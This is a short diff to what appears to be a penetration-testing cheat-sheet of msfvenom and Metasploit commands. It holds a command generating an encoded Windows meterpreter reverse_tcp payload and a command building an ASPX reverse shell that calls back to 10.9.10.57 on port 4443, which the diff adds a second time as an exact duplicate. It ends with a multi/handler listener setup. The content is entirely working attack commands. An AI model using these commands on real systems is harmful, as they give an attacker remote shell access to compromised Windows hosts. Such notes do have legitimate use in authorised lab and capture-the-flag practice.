@@ -4,6 +4,9 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 # Create Windows ASPX reverse shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.10.57 LPORT=4443 -f aspx -o rsh.aspx
 
+# Create Windows ASPX reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.10.57 LPORT=4443 -f aspx -o rsh.aspx
+
 # Start listener in Metasploit
 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <your-ip> set LPORT 4444 run
 
